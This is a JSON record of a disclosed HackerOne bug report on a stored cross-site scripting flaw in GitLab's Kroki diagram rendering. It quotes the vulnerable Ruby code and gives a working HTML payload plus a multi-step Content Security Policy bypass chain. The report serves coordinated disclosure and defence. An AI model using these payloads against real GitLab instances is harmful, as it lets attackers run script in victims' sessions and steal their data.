{
  "id": 1731349,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzMxMzQ5",
  "url": "https://hackerone.com/reports/1731349",
  "title": "Stored XSS via Kroki diagram",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2022-10-12T12:00:52.731Z",
  "submitted_at": "2022-12-17T10:52:08.221Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "vakzz",
    "url": "/vakzz",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVEZVZRGT%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143135Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDWYnKQYclS61T7MxyY%2BjY2cTGJfHQYiuqjFad7wYMiIQIgNeAdMumlTdeq4lMQ9WuVLpSm3yzw1mGivXNXDgULpQYqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDMLcGZVE5RFfToAXbiqPBSIrlo8UgAGVOM8KidbtxWc6SkEozzwTegh3NbBOLdZfEvWEihLuxXAShaviKXGRtWGNNcTm30P5A0mmD4y97LGN5riH00YMLzMEuOG2a7fdYJ36B23e4AS9L88QjHyhr4MbbEfdVWyqQkwdoR89KYCUi7N4tmQ7ndMbdcgw5PoIhNIEyEF4J%2FAET2o9v3OatrFuPPhODhA4By164RMLG2fJxZ8GftDPQmkdaFW1bRI66pI3%2FabuYCXZR5qcQprepoZ83IaWDJp0PZqOr5GlqhAUmcIT7NSizOv3%2BUQA2ktAImaQWn4WqqotIaa1%2FISuePrF9hRRbOPlzGaH6nERd3ZZbEWircOqLnPqxKHKmJfpZ4tm%2BPm6Gu7Sy2jeJRK0c3GsKhnxrHLIQ1s4OOKyH7RRCG0xdjjm201jL2Zx1tK%2FBjFvP45y%2BozBkPWCUuUXdKMvx6jAEMVi75IwkdWD%2Fv8G0sCRNQb3jle%2Fmx6KDqwzLJ61QViZ2AGNrOhLosvGR5M9GNR4b4wYml2K0Bu5CGhw9a5rTkbK%2F5%2FXumd4%2FF%2BNdGWl9PEeESKTEVD%2B8Ti74UzGOZUVZAvYLaQDU%2BitzQkZvaIru2uRPMT1G7GlxZg7EeoDu1AqxijegN5a0N8KR9plwCv7j5jk8Jkh0zALBB1XOLuu7HQPHqoWmIfCFT3pA%2Bgoeb83sKkUxgGaQNO7duOQDVAR6VNIOnu3frRnR5z4sTEHwdgrpHZCzSExVCERP%2BGHtiP36f62T%2F8Dk8%2B%2Bf4MFMY4aOT0b4EKRltyMscVBoUl7LuMMf6y8xRYStpCeW8ug%2BfEf2b8xJrHFwa8%2FefhAWgLmq7Gs19XL8CpFpfhEz81WFH0hs%2B0gP3FgGdEwwumtrgY6sQH%2BYDXfy1qTDKNd5azqxyOrh0eirJIDZhcGnN9ZlMSVfbiighCHS998IAIcNaZpNCNOqybBEqous9HWd6Om7k2j1GGXF5s6J69JZPlpit380jbtUquAnwR%2B52D9JK5omCjq7IvKcx%2BJYvXi2FlHutTh32wphToYyGkZGs03Xyfk5rzXvwyB18SUMnaLEmwojIY9Hh9wOsOU4ydsoidjFzrlQdMgNa26f2pGAVps0viYSzs%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ef4ae28cf19c9a22d97df14dc628108339cb51a385c55f37073ab6317c6338ee"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2023-06-02T01:55:16.700Z",
  "bug_reporter_agreed_on_going_public_at": "2023-05-01T23:48:20.656Z",
  "team_member_agreed_on_going_public_at": "2023-06-02T01:55:16.560Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary\n\nIf Kroki has been enabled, it's possible to craft a `pre` block so that arbitrary attributes can be injected into the resulting `img` tag. \n\nThe css selector for finding a valid node to convert into a kroki diagram checks for either `pre[lang=\"#{diagram_type}\"] > code` or for `pre > code[lang=\"#{diagram_type}\"]`, but the diagram type is then set using `node.parent['lang'] || node['lang']`.\n\nSo if the `code` block has a valid lang (such as `wavedrom`) then the css selector will match, but if the parent `pre` also has a `lang` attribute then it will be the one that is used and can be an arbitrary value.\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.6.2-ee/lib/banzai/filter/kroki_filter.rb#L17\n```ruby\n        diagram_selectors = ::Gitlab::Kroki.formats(settings)\n                                .map do |diagram_type|\n                                  %(pre[lang=\"#{diagram_type}\"] > code,\n                                  pre > code[lang=\"#{diagram_type}\"])\n                                end\n                                .join(', ')\n\n        xpath = Gitlab::Utils::Nokogiri.css_to_xpath(diagram_selectors)\n        return doc unless doc.at_xpath(xpath)\n\n        diagram_format = \"svg\"\n        doc.xpath(xpath).each do |node|\n          diagram_type = node.parent['lang'] || node['lang']\n          diagram_src = node.content\n          image_src = create_image_src(diagram_type, diagram_format, diagram_src)\n```\n\nThe `diagram_type` is then used as-is to create a url, which is used to create an image with `<img src=\"#{image_src}\" />`. So if a double quote is used in the `diagram_type` then arbitrary attributes can be added (apart from `class` as that is replaced just below).\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.6.2-ee/lib/banzai/filter/kroki_filter.rb#L31\n```ruby\n          image_src = create_image_src(diagram_type, diagram_format, diagram_src)\n          img_tag = Nokogiri::HTML::DocumentFragment.parse(%(<img src=\"#{image_src}\" />))\n          img_tag = img_tag.children.first\n\n          next if img_tag.nil?\n\n          lazy_load = diagram_src.length > MAX_CHARACTER_LIMIT\n          img_tag.set_attribute('hidden', '') if lazy_load\n          img_tag.set_attribute('class', 'js-render-kroki')\n\n          img_tag.set_attribute('data-diagram', diagram_type)\n          img_tag.set_attribute('data-diagram-src', \"data:text/plain;base64,#{Base64.strict_encode64(diagram_src)}\")\n\n          node.parent.replace(img_tag)\n```\n\n### Steps to reproduce\n\n1. On a self-hosted gitlab, ensure that `Kroki` is enabled at `/admin/application_settings/general`{F2080922} \n1. Create an issue and use the following payload `<a><pre lang='f/\" onerror=alert(1) onload=alert(1) '><code lang=\"wavedrom\">xss</code></pre></a>`\n1. Reload/Visit the issue\n1. If you do not have CSP enabled you will see the alert pop, otherwise you will see a CSP violation in the console such as `Refused to execute inline event handler because it violates the following Content Security Policy directive`\n\nSince the `class` attribute cannot be set finding a CSP bypass was a bit tricky but there are still a few `data` based attributes that can be used, one of them being `data-diff-for-path` from `single_file_diff.js`. This is used as the path to load when the \"expand diff\" chevron is clicked allowing an arbitrary json file to be loaded and have jquery execute it to bypass the CSP.\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.6.2-ee/app/assets/javascripts/single_file_diff.js#L77\n```javascript\n    return axios\n      .get(this.diffForPath)\n      .then(({ data }) => {\n        this.loadingContent.hide();\n        if (data.html) {\n          this.content = $(data.html);\n```\n\nSince clicking the chevron is a bit unlikely, we can inject the `style` attribute to make the kroki overlay the entire page,  which when clicked injects some styles to make the `chevron` now overlay the entire page. \n\n1. Enable CSP on gitlab - https://docs.gitlab.com/omnibus/settings/configuration.html#set-a-content-security-policy\n1. Create a public snippet  with a json file `aaa.json` containing `{\"html\":\"<script>alert(document.domain)</script>\"}`, then open the `raw` version and make note of the path.\n1. Create a new project and commit a readme\n1. View the individual commit (eg http://gitlab.wbowling.info/root/kroki1/-/commit/f4170b940214abeebc6fd7503f9500c72c358613)\n1. Add a comment to a line of the commit using the following payload, replacing `data-diff-for-path` with the path to your json file noted above:\n```html\n<a>\n    <pre lang='/\" data-diff-for-path=/root/kroki1/-/snippets/9/raw/main/aaa.json '>\n        <code lang=\"wavedrom\">csp</code>\n    </pre>\n    <pre\n        lang='/\" id=stage1 style=\"position:absolute;max-width:10000px;left:-1000px;top:-1000px;width:10000px;height:10000px;z-index:10000;\" data-triggers=\"click\" data-toggle=popover data-html=true data-title=\"aaa&lt;style&gt;#stage1{pointer-events:none}svg.chevron-right{position:absolute;max-width:10000px;left:-1000px;top:-1000px !important;width:10000px;height:10000px;z-index:10001;}&lt;/style&gt;bbb\" data-content=ggg '>\n    <code lang=\"wavedrom\">\n    bypass\n    </code>\n    </pre>\n</a>\n```\n1. Reload the page\n1. Clicking anywhere on the page twice will trigger the xss\n\n{F2080931}\n\n### Impact\n\nAllows arbitrary javascript to be executed when a victim views a comment \n\n### What is the current *bug* behavior?\n\nThe the lang attribute from the parent node is always used even if the css selector matches the child node\n\n### What is the expected *correct* behavior?\n\nThe lang attribute should only be used if it is actually valid. The `img` tag should also be created using `content_tag` instead of string concatination.\n\n### Output of checks\n#### Results of GitLab environment info\n\n```\n$ sudo gitlab-rake gitlab:env:info\n\nSystem information\nSystem:\t\tUbuntu 20.04\nProxy:\t\tno\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.7.6p219\nGem Version:\t3.1.6\nBundler Version:2.3.15\nRake Version:\t13.0.6\nRedis Version:\t6.2.7\nSidekiq Version:6.5.7\nGo Version:\tunknown\n\nGitLab information\nVersion:\t15.6.2-ee\nRevision:\t08b668e8740\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t12.12\nURL:\t\thttp://gitlab.wbowling.info\nHTTP Clone URL:\thttp://gitlab.wbowling.info/some-group/some-project.git\nSSH Clone URL:\tgit@gitlab.wbowling.info:some-group/some-project.git\nElasticsearch:\tno\nGeo:\t\tno\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers:\n\nGitLab Shell\nVersion:\t14.13.0\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\n```\n\n## Impact\nAllows arbitrary javascript to be executed when a victim views a comment \n",
  "bounty_amount": "13950.0",
  "formatted_bounty": "$13,950",
  "weakness": {
    "id": 62,
    "name": "Cross-site Scripting (XSS) - Stored"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 2080922,
      "file_name": "image.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/i9bru7rouwb1vw0z1eff4onfyntv?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVEZVZRGT%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143135Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDWYnKQYclS61T7MxyY%2BjY2cTGJfHQYiuqjFad7wYMiIQIgNeAdMumlTdeq4lMQ9WuVLpSm3yzw1mGivXNXDgULpQYqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDMLcGZVE5RFfToAXbiqPBSIrlo8UgAGVOM8KidbtxWc6SkEozzwTegh3NbBOLdZfEvWEihLuxXAShaviKXGRtWGNNcTm30P5A0mmD4y97LGN5riH00YMLzMEuOG2a7fdYJ36B23e4AS9L88QjHyhr4MbbEfdVWyqQkwdoR89KYCUi7N4tmQ7ndMbdcgw5PoIhNIEyEF4J%2FAET2o9v3OatrFuPPhODhA4By164RMLG2fJxZ8GftDPQmkdaFW1bRI66pI3%2FabuYCXZR5qcQprepoZ83IaWDJp0PZqOr5GlqhAUmcIT7NSizOv3%2BUQA2ktAImaQWn4WqqotIaa1%2FISuePrF9hRRbOPlzGaH6nERd3ZZbEWircOqLnPqxKHKmJfpZ4tm%2BPm6Gu7Sy2jeJRK0c3GsKhnxrHLIQ1s4OOKyH7RRCG0xdjjm201jL2Zx1tK%2FBjFvP45y%2BozBkPWCUuUXdKMvx6jAEMVi75IwkdWD%2Fv8G0sCRNQb3jle%2Fmx6KDqwzLJ61QViZ2AGNrOhLosvGR5M9GNR4b4wYml2K0Bu5CGhw9a5rTkbK%2F5%2FXumd4%2FF%2BNdGWl9PEeESKTEVD%2B8Ti74UzGOZUVZAvYLaQDU%2BitzQkZvaIru2uRPMT1G7GlxZg7EeoDu1AqxijegN5a0N8KR9plwCv7j5jk8Jkh0zALBB1XOLuu7HQPHqoWmIfCFT3pA%2Bgoeb83sKkUxgGaQNO7duOQDVAR6VNIOnu3frRnR5z4sTEHwdgrpHZCzSExVCERP%2BGHtiP36f62T%2F8Dk8%2B%2Bf4MFMY4aOT0b4EKRltyMscVBoUl7LuMMf6y8xRYStpCeW8ug%2BfEf2b8xJrHFwa8%2FefhAWgLmq7Gs19XL8CpFpfhEz81WFH0hs%2B0gP3FgGdEwwumtrgY6sQH%2BYDXfy1qTDKNd5azqxyOrh0eirJIDZhcGnN9ZlMSVfbiighCHS998IAIcNaZpNCNOqybBEqous9HWd6Om7k2j1GGXF5s6J69JZPlpit380jbtUquAnwR%2B52D9JK5omCjq7IvKcx%2BJYvXi2FlHutTh32wphToYyGkZGs03Xyfk5rzXvwyB18SUMnaLEmwojIY9Hh9wOsOU4ydsoidjFzrlQdMgNa26f2pGAVps0viYSzs%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0dc081a6256eb26bf4d7894c351116325e98f55aa986cee16540c71108f9afb3",
      "file_size": 260045,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 2080931,
      "file_name": "gitlab-csp.mp4",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7zcjjmwy02ki4mcyqs5qs57m0pi2?response-content-disposition=attachment%3B%20filename%3D%22gitlab-csp.mp4%22%3B%20filename%2A%3DUTF-8%27%27gitlab-csp.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVEZVZRGT%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143135Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDWYnKQYclS61T7MxyY%2BjY2cTGJfHQYiuqjFad7wYMiIQIgNeAdMumlTdeq4lMQ9WuVLpSm3yzw1mGivXNXDgULpQYqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDMLcGZVE5RFfToAXbiqPBSIrlo8UgAGVOM8KidbtxWc6SkEozzwTegh3NbBOLdZfEvWEihLuxXAShaviKXGRtWGNNcTm30P5A0mmD4y97LGN5riH00YMLzMEuOG2a7fdYJ36B23e4AS9L88QjHyhr4MbbEfdVWyqQkwdoR89KYCUi7N4tmQ7ndMbdcgw5PoIhNIEyEF4J%2FAET2o9v3OatrFuPPhODhA4By164RMLG2fJxZ8GftDPQmkdaFW1bRI66pI3%2FabuYCXZR5qcQprepoZ83IaWDJp0PZqOr5GlqhAUmcIT7NSizOv3%2BUQA2ktAImaQWn4WqqotIaa1%2FISuePrF9hRRbOPlzGaH6nERd3ZZbEWircOqLnPqxKHKmJfpZ4tm%2BPm6Gu7Sy2jeJRK0c3GsKhnxrHLIQ1s4OOKyH7RRCG0xdjjm201jL2Zx1tK%2FBjFvP45y%2BozBkPWCUuUXdKMvx6jAEMVi75IwkdWD%2Fv8G0sCRNQb3jle%2Fmx6KDqwzLJ61QViZ2AGNrOhLosvGR5M9GNR4b4wYml2K0Bu5CGhw9a5rTkbK%2F5%2FXumd4%2FF%2BNdGWl9PEeESKTEVD%2B8Ti74UzGOZUVZAvYLaQDU%2BitzQkZvaIru2uRPMT1G7GlxZg7EeoDu1AqxijegN5a0N8KR9plwCv7j5jk8Jkh0zALBB1XOLuu7HQPHqoWmIfCFT3pA%2Bgoeb83sKkUxgGaQNO7duOQDVAR6VNIOnu3frRnR5z4sTEHwdgrpHZCzSExVCERP%2BGHtiP36f62T%2F8Dk8%2B%2Bf4MFMY4aOT0b4EKRltyMscVBoUl7LuMMf6y8xRYStpCeW8ug%2BfEf2b8xJrHFwa8%2FefhAWgLmq7Gs19XL8CpFpfhEz81WFH0hs%2B0gP3FgGdEwwumtrgY6sQH%2BYDXfy1qTDKNd5azqxyOrh0eirJIDZhcGnN9ZlMSVfbiighCHS998IAIcNaZpNCNOqybBEqous9HWd6Om7k2j1GGXF5s6J69JZPlpit380jbtUquAnwR%2B52D9JK5omCjq7IvKcx%2BJYvXi2FlHutTh32wphToYyGkZGs03Xyfk5rzXvwyB18SUMnaLEmwojIY9Hh9wOsOU4ydsoidjFzrlQdMgNa26f2pGAVps0viYSzs%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=273e647db0f97942cbaeee81f9c3df5e96f6ee5e282958befc00705b7bf2b4b8",
      "file_size": 3872639,
      "type": "video/mp4",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 267,
  "voters": [
    "monke",
    "maskopatol",
    "shishtawy_sec",
    "abdallah_samir",
    "usamasood",
    "cxzer0",
    "shreyaschavhan",
    "kinuzo",
    "mamrezzsr",
    "alienisgrinding",
    "and 257 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 8.7,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "required",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 39022,
    "asset_type": "OTHER",
    "asset_identifier": "Your Own GitLab Instance",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
